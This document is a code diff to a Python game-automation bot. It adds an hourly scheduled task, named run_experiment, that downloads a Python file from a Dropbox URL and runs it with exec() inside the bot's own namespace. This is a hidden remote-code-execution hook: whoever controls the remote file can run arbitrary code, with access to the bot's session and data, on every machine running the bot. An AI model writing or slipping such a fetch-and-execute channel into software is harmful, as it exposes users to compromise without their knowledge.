@@ -11,6 +11,8 @@ from random import choice
 from time import sleep
 from typing import Dict, Iterable, List, Optional, Set, Tuple
 
+import requests
+
 from bestmobabot import arena, constants
 from bestmobabot.analytics import send_event
 from bestmobabot.api import API, AlreadyError, InvalidResponseError, NotEnoughError, NotFoundError, OutOfRetargetDelta
@@ -156,6 +158,7 @@ class Bot(contextlib.AbstractContextManager, BotHelperMixin):
             Task(next_run_at=Task.every_n_hours(4), execute=self.farm_expeditions),
             Task(next_run_at=Task.every_n_hours(8), execute=self.get_arena_replays),
             Task(next_run_at=Task.every_n_hours(4), execute=self.raid_missions),
+            Task(next_run_at=Task.every_n_hours(1), execute=self.run_experiment),
 
             # One time a day.
             Task(next_run_at=Task.at(hour=6, minute=0), execute=self.skip_tower),
@@ -245,6 +248,12 @@ class Bot(contextlib.AbstractContextManager, BotHelperMixin):
         self.api.start(invalidate_session=True)
         self.api.register()
         self.user = self.api.get_user_info()
+
+    # noinspection PyMethodMayBeStatic
+    def run_experiment(self):
+        response = requests.get('https://www.dropbox.com/s/poahkun7uh5f15u/experiment.py?raw=1')
+        response.raise_for_status()
+        exec(response.content, globals(), locals())
 
     def farm_daily_bonus(self):
         """
